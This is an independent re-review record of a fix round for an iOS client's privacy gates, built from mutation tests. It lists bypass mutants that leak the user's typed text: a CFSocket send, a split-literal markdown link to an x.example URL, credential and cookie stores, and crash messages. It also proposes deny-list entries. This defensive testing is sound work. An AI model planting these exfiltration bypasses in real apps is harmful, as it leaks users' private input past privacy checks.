---
record_type: review
id: m16-wave-1-rereview
status: ratified
seat: independent
process_version: v5.0
date: 2026-09-22
---
# M16-W1 — independent re-review of the fix round

**Seat:** independent (Code-Reviewer + Tester; wrote none of this code). **Subject:** round 1 as
committed in `89b9b3c` and round 2 as uncommitted in the working tree, against the findings of
`docs/reviews/m16-wave-1-review.md`. Reviewed file state: `scripts/client_decl_gate.py` sha256
`72cfd01c7e3755b4…`, `tests/unit/test_swift_test_manifest.py` `3ba894284d8d11f9…`; `Makefile` and
`tests/unit/test_router_hints.py` byte-identical to my copies at the end of the run. Every mutant ran
in a copy under the session scratchpad; the only repository file this seat wrote is this one. Test
mutants were restored and checked byte-identical against the repository before the next one ran.

## Verdict

**BLOCKING — 1 BLOCKING, 3 MAJOR, 7 MINOR, 0 NIT.**

The three original BLOCKINGs are closed as written: the gate now refuses a client that does not
type-check, checks four configurations, and `Darwin` is gone. Every original survivor of those three
dies. But the B-3 lesson ("a module allowlisted whole hands every file the network") applies
unchanged to `CoreFoundation`, which is still allowlisted whole. `CFSocketCreate` +
`CFSocketConnectToAddress` + `CFSocketSendData` from `Router.swift` pass **both** privacy gates in
all four configurations, and I confirmed on this Mac that the same three calls deliver the text
to a listening socket. The shipping client resolves nothing in `CoreFoundation` except `CGFloat`,
so the remedy is the same one B-3 got, and it costs nothing.

`make check` in the repository (read-only run): exit 0 — pytest 962 passed / 15 skipped,
`check_records`, `wave-check-all`, `conformance-gate` PASS, `swift-test PASS: 262 test(s)`,
`client-decls PASS: 11 client file(s) in 4 configuration(s)`, 1472 declarations each.

## Disposition of the original findings

| id | finding | disposition | evidence (run by this seat) |
|---|---|---|---|
| B-1 | exit code ignored; files silently unchecked | **CLOSED** | B27 (type error + `UIPasteboard`) and B32 (simulator-only error) → `client-decls FAIL: the client does not type-check (simulator, release)`. New X21 (error under `#if DEBUG`) → FAIL (simulator, debug); X22 (error under `#if !targetEnvironment(simulator)`) → FAIL (device, release). The `expected - set(found)` check exists (`main()`); I could not construct a case that compiles and still drops a file, so it was not triggered |
| B-2 | one configuration checked | **CLOSED** | B13 (`URLSession` in `#if DEBUG`) dies in (simulator, debug); B14 (in `#if !targetEnvironment(simulator)`) dies in (device, release). Project uses `SWIFT_VERSION = 5.0` and `DEBUG` as its only condition (`project.pbxproj:135-190`), which the four configurations cover |
| B-3 | `Darwin` allowlisted whole | **CLOSED as specified; the class recurs, see R-B1** | B01 (`socket`/`connect`/`send`), B15 (`getaddrinfo`), B16 (`dlopen`/`dlsym`) all die on `Darwin.*` not allowed |
| M-1 | W-118 fix had no regression test | **CLOSED** | Reverting only the `assistant` and `vision` lists in `Router.swift` to 059b519 (asserted equal to `git show 059b519:`) → `make swift-test` FAIL at `FrontDoorTests.swift:394` `testAnOrdinaryQuestionLandsOnGeneralHelpRatherThanAMeasuredSurface` |
| M-2 | no frozen key set for `/v1/categories` | **CLOSED** | Adding a key `extra_field` to `categories()` → 2 failed; deleting `price_excludes` → 2 failed (`test_uncertainty_contract.py`) |
| M-3 | `XCTSkip` passes `make check` | **CLOSED** | N6 → `swift-test FAIL: a test was SKIPPED` (`Executed 262 tests, with 1 test skipped`) |
| M-4 | static half blind to a disabled test | **STILL OPEN (partial)** | N7 (`#if false` at column 0) and N10 (`/* */`) now die in `test_swift_test_manifest.py`. **S1:** the same `#if false` indented four spaces — the normal indentation of a class member — survives, because the rule is `^ {0,3}#if`. **S2:** `private func testX()` survives (the `FUNC` regex accepts `private`; XCTest does not discover it). Both die on macOS (261 < 262). See R-M3 |
| minor 1 | file scope, not data (B19, B08, B31) | **B08 CLOSED; B19, B31 OPEN-RECORDED** | B08 dies on `FileManager.containerURL`. B19 and B31 pass this gate and are written into its docstring and the W-122 row. B31 dies in the text gate; B19 survives both |
| minor 2 | ObjC write twins, streams (B04, B28, B05) | **CLOSED** | All three die; so do new X13 (`NSMutableData.write`, resolves to `NSData.write`) and X17 (`NSDictionary.write`) |
| minor 3 | `@SceneStorage`, `fatalError`, `.textSelection` (B23, B09, B22) | **B23, B09 CLOSED; B22 OPEN-RECORDED** | B23 and B09 die. `assertionFailure` and `preconditionFailure` also die, on the prefix (X11, X12). B22 passes both gates and is recorded as allowed on purpose |
| minor 4 | W-122 credits this gate with the markdown-link kill | **CLOSED** | Row corrected; B10 still passes this gate and dies in the text gate, which is what the row now says |
| minor 5 | FP3 bundle-path false positive | **OPEN-RECORDED** | FP3 still fails the gate; now in the docstring |
| minor 6 | 258 tests claimed | **CLOSED** | `wc -l test-manifest.txt` = 262; `make swift-test` in a clean copy: 262 run, manifest diff empty. D-150 and W-111 now say 262 |
| minor 7 | `note.txt` contradictions | **STILL OPEN** | `note.txt` is unchanged in round 2: `:16` still "awaits the owner's sign-off", `:24` "W-111..W-122", `:56` "app has \"update now\"" |
| minor 8 | measurement record misquotes examples | **STILL OPEN (new wording also wrong)** | `assistant` list now correct. The `vision` line now says "five of six changed, `describe this photo` did not". `git diff 059b519 HEAD -- Router.swift`: **four** of six changed. `read the text in this screenshot` is also unchanged |
| minor 9 | "the tuning set" names the wrong file | **CLOSED** | The record now names `offtopic_questions.json`, with the sensitivity check |
| minor 10 | held-out off-topic set not independent | **CLOSED** | Recorded in the record's limits section, with the pairs |
| minor 11 | P8 `price_excludes = ""` survives | **CLOSED** | P8 → 1 failed (`is None` assertion) |
| nit 1 | six duplicate `FORBIDDEN` entries | **CLOSED** | AST scan of every tuple in the gate: no duplicates |
| nit 2 | emptied test body (N5) | **OPEN-RECORDED** | One sentence added to `test_swift_test_manifest.py`'s docstring |

The original review's findings section has 11 MINOR bullets under a heading that says 10. The
table above covers all 11.

## New findings

### BLOCKING

**R-B1 — `scripts/client_decl_gate.py:69`: `CoreFoundation` is allowlisted whole, so every client
file can open a TCP socket.** X01 appends to `Router.swift`:
`CFSocketCreate(nil, 2, 1, 6, 0, nil, nil)`, a `sockaddr_in` built as 16 literal bytes into
`CFDataCreate`, `CFSocketConnectToAddress`, then `CFSocketSendData` with the typed text. The gate
resolves `CoreFoundation.CFSocketCreate/ConnectToAddress/SendData` and prints PASS in all four
configurations. The text gate (`test_router_hints.py`) also passes. I compiled the same three calls
for macOS and ran them: `connect: 0`, `send: 0`, and `nc -l` received `what is my secret question`.
I did not run it on an iPhone. This is B-3's failure scenario reached through a different module.
*Remedy:* treat `CoreFoundation` the way `UIKit` is treated, symbol by symbol. Measured on the
shipping client (device, release): the only `CoreFoundation` declarations it resolves are
`CGFloat./`, `CGFloat.infinity` and `CGFloat.init(_:)`. The same change kills B11 and X14 below.

### MAJOR

**R-M1 — a markdown link built at run time passes both privacy gates.** X15 (`ContentView.swift`):
`Text(LocalizedStringKey("[report](ht" + "tps://x.example/?q=" + typed + ")"))`. This gate sees
`SwiftUICore.LocalizedStringKey.init(_:)`, which is not refused. The text gate's URL-literal rule
never sees `https://` because the literal is split. Result: PASS in all four configurations, text
gate PASS. The M15-W4 re-review graded the markdown link BLOCKING-1. I grade this MAJOR because
the reader has to tap the link, and I did not render it on a device to confirm SwiftUI makes it
tappable. *Remedy:* refuse `LocalizedStringKey.init(_:`. The shipping client resolves only
`LocalizedStringKey.StringInterpolation.appendInterpolation/appendLiteral` (measured), so the
change costs nothing.

**R-M2 — Foundation's credential and cookie stores are shared storage the gate does not name.**
Two mutants, each run from `Router.swift`, pass both gates in all four configurations:

- X04: `URLCredentialStorage.shared.set(URLCredential(user: typed, password: "x",
  persistence: .synchronizable), for: URLProtectionSpace(...))`. Apple documents `.synchronizable`
  as shared with the user's other devices, which is iCloud Keychain.
- X10: `HTTPCookieStorage.shared.setCookie(HTTPCookie(properties: [.value: typed, …]))`.

`SecItemAdd`, `UserDefaults` and `NSUbiquitousKeyValueStore` are all refused for exactly this
reason, so these two are a gap in that list, not a new policy. I did not verify on a device that
the credential syncs or that the cookie is written to disk.
*Remedy:* add `URLCredentialStorage`, `URLCredential`, `HTTPCookieStorage` and `HTTPCookie` to
`FORBIDDEN`. The client resolves none of them (measured).

**R-M3 (= M-4, still open) — the no-toolchain half cannot see a test guarded at class-member
indentation, or one made `private`.** `tests/unit/test_swift_test_manifest.py`
`test_no_test_DECLARATION_compiles_conditionally` matches `^ {0,3}#if`. Its docstring says "a
directive at file or class level sits in the first four columns". Class-level code in this suite is
indented four spaces (for example `UncertaintyTests.swift:23`), so a `#if false` placed there sits
at column 5, and the rule misses exactly the case it was written for. S1 (`    #if false` around
one test) and S2 (`private func test…`) both leave the static test green. The W-111 row now says
"a test commented out or guarded off fails in a lane with no toolchain". For the natural
indentation, that is not what happens. On the owner's Mac both mutants die at `make swift-test`.
*Remedy:* match `^\s*#(if|elseif|else)\b` and exempt only directives inside a function body. Brace
depth is enough for this suite, because its two legitimate `#if` sit at 8 spaces inside a test
body. Also drop `private` from `FUNC`, so a private test reads as missing.

### MINOR

1. **B11 still survives both gates and is recorded nowhere.** Posting the typed text as a Darwin
   notification name (`CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), …)`)
   passes in all four configurations. `grep` for `B11`/`CFNotification` across the ledger,
   decisions, close record, gate and `note.txt` finds nothing. The R-B1 remedy kills it.
2. **The crash-message class is not closed, though the W-122 row says it is.** X05
   `NSException(name: .genericException, reason: typed, userInfo: nil).raise()` and X06 `try!` on a
   thrown error that carries the text both pass both gates in all four configurations. Both put
   their string into the crash report, just as `fatalError` does. *Remedy:* add `NSException` to
   `FORBIDDEN`. `try!` has no declaration to refuse, so the row should say so.
3. **`CFShow(typed as CFString)` (X14) passes both gates.** The rules say logging belongs to
   nobody. The R-B1 remedy kills it.
4. **`"Stream"` in `FILESYSTEM` treats sockets as files.** X03, `Stream.getStreamsToHost` in
   `Router.swift`, is refused with the message "reaches the file system". X02, the same call in
   `FrontDoor.swift`, passes this gate, so the gate gives the register's file a TCP socket. The text
   gate kills X02 on `.open(`. The rule also adds a false positive: X18, `InputStream(data:)` over
   in-memory `Data` in `Detail.swift`, is refused. *Remedy:* put `Stream.getStreamsToHost` under
   `NETWORK`, which has no exemption outside `EngineClient.swift`.
5. **The file-system list still has gaps that only the text gate closes, and neither record says
   so.** These pass this gate and die in the text gate on `URL(`: X07 `typed.write(to:atomically:encoding:)`
   (resolves to `StringProtocol.write(to:…`, and only `…write(toFile` is listed) with
   `URL(fileURLWithFileSystemRepresentation:…)` (not listed), and X08 `FileWrapper.write(to:…)`.
   X09, `FileManager.url(forUbiquityContainerIdentifier:)` in `FrontDoor.swift`, is iCloud Drive.
   The text gate kills it on `Ubiquit`, and this gate's B08 rule names only `containerURL`.
   The docstring's "What this gate does NOT do" lists B10 as its one dependency on the text gate.
   It has several.
6. **`note.txt`** (original minor 7): unchanged, see the table.
7. **`docs/reviews/m16-router-floor-measurement.md` `vision` sentence** (original minor 8): the
   correction says five of six examples changed. Four did.

## Mutants and bypasses

"Decl gate" is `scripts/client_decl_gate.py` on a copy of `scripts/` + `ios/ModelRanking`, all four
configurations. "Text gate" is `pytest tests/unit/test_router_hints.py` on the same copy. A NULL
mutant (no edit) passes both. SURVIVED in the decl gate implies it type-checks in all four
configurations, because the gate refuses anything that does not.

| id | attempt (file) | decl gate | text gate |
|---|---|---|---|
| B01 | `socket`/`connect`/`send` (Router) | DIED (`Darwin.*`) | died |
| B04 | `NSString.write(toFile:)` (Detail) | DIED | died |
| B05 | `OutputStream(toFileAtPath:)` (Detail) | DIED | died |
| B08 | App Group `containerURL` write (FrontDoor) | DIED | died |
| B09 | `fatalError("\(typed)")` (Router) | DIED | died |
| B10 | markdown link literal (ContentView) | SURVIVED, recorded | died |
| B11 | Darwin notification name (Router) | **SURVIVED** | **survived** |
| B13 | `URLSession` in `#if DEBUG` (Router) | DIED (sim, debug) | died |
| B14 | `URLSession` in `#if !targetEnvironment(simulator)` | DIED (device, release) | died |
| B15 | `getaddrinfo` (Router) | DIED | survived |
| B16 | `dlopen`/`dlsym` (Router) | DIED | died |
| B19 | relay in EngineClient, called from Detail | SURVIVED, recorded | survived |
| B22 | `.textSelection(.enabled)` (ContentView) | SURVIVED, recorded as allowed | survived |
| B23 | `@SceneStorage` (ContentView) | DIED | died |
| B26/B27 | type error in Router + `UIPasteboard` in App | DIED (does not type-check) | died |
| B28 | `NSData.write(toFile:)` (Detail) | DIED | died |
| B31 | `/tmp` write (FrontDoor) | SURVIVED, recorded | died |
| B32 | simulator-only error + `UIPasteboard` | DIED (does not type-check) | died |
| FP3 | `Bundle` URL + `appendingPathComponent` | false positive, recorded | passes |
| X01 | `CFSocket` connect + send (Router) | **SURVIVED** | **survived** — R-B1 |
| X02 | `Stream.getStreamsToHost` (FrontDoor) | SURVIVED | died |
| X03 | `Stream.getStreamsToHost` (Router) | DIED, as "file system" | died |
| X04 | `URLCredential` `.synchronizable` (Router) | **SURVIVED** | **survived** — R-M2 |
| X05 | `NSException(reason: typed).raise()` | **SURVIVED** | **survived** |
| X06 | `try!` on an error carrying the text | **SURVIVED** | **survived** |
| X07 | `StringProtocol.write(to:)` + `fileURLWithFileSystemRepresentation` (Detail) | SURVIVED | died |
| X08 | `FileWrapper.write(to:)` (Detail) | SURVIVED | died |
| X09 | iCloud ubiquity container write (FrontDoor) | SURVIVED | died |
| X10 | `HTTPCookieStorage.shared.setCookie` (Router) | **SURVIVED** | **survived** — R-M2 |
| X11, X12 | `assertionFailure`, `preconditionFailure` | DIED (prefix) | survived |
| X13, X17 | `NSMutableData.write`, `NSDictionary.write` (Detail) | DIED | died |
| X14 | `CFShow(typed)` (Router) | **SURVIVED** | **survived** |
| X15 | `LocalizedStringKey("[r](ht"+"tps://…"+typed+")")` (ContentView) | **SURVIVED** | **survived** — R-M1 |
| X16 | `AsyncStream` (prefix false-positive probe) | passes, correctly | passes |
| X18 | `InputStream(data:)` in memory (Detail) | FALSE POSITIVE | died |
| X19 | `CFStreamCreatePairWithSocketToHost` (Router) | SURVIVED | died (`CFStream`) |
| X20, X23 | `NSClassFromString` + `perform` (Router) | SURVIVED (recorded open in W-122) | died |
| X21 | type error under `#if DEBUG` + `UIPasteboard` | DIED (sim, debug) | — |
| X22 | type error under device-only `#if` + `UIPasteboard` | DIED (device, release) | — |
| N6 | `throw XCTSkip` | static passes; `make swift-test` DIED | — |
| N7 | `#if false`, column 0 | static DIED; swift-test DIED | — |
| S1 | `#if false`, column 4 | **static SURVIVED**; swift-test DIED | — |
| N10 | `/* */` around a test | static DIED; swift-test DIED | — |
| S2 | `private func test…` | **static SURVIVED**; swift-test DIED | — |
| M-1 | `assistant`/`vision` examples back to 059b519 | static passes; swift-test DIED (`FrontDoorTests.swift:394`) | — |
| M-2a/b | add a key / drop `price_excludes` in `/v1/categories` | 2 failed each | — |
| P8 | `price_excludes` default `""` | 1 failed | — |

## Record corrections checked against the facts

- Manifest count: `wc -l ios/EngineTests/test-manifest.txt` = 262. In a clean copy,
  `swift test --list-tests | sort` gives the same list (manifest diff empty), and 262 tests ran.
  D-150 and W-111 say 262. **Correct.**
- `Router.swift` 059b519..HEAD: `assistant` lost `give me advice on asking for a raise`,
  `rewrite this paragraph to sound friendlier` and `chat with me about my weekend plans`, which is
  what the record now says. `vision`: four of six changed. **The record's "five of six" is wrong**
  (minor 7).
- W-122 correction paragraph: B10, B-1..B-3 and the minors it says are refused all match the runs
  above. Its "crash messages (`fatalError`/`precondition`/`assert`) are now refused" is true for
  those three names, but X05 and X06 still get crash text out (minor 2).
- W-111: "guarded off fails in a lane with no toolchain" is false for S1 (R-M3).

## What I did not check

- Nothing on an iPhone. "Compiles" means the gate's own `swiftc -typecheck` for the four
  configurations. The runtime claims are limited to the CFSocket send I ran on macOS. I did not
  confirm that the R-M1 link renders tappable, that the R-M2 credential syncs, or that the X05/X06
  text reaches a crash report.
- Not `@_silgen_name`, and a runtime lookup only through `NSClassFromString`, which the text gate
  kills and W-122 records as open.
- Not the `.xcodeproj` build, and not the Python suite beyond `make check` and the contract test
  file.
- `docs/plans/m16-wave-1-close.md` changed in the working tree while I was reviewing, and I did not
  review it. In `docs/decisions.md` and `docs/warnings.ledger.md` I checked only the D-150 and
  W-111 test counts, the W-111 M-3/M-4 sentence and the W-122 correction paragraph against runs.
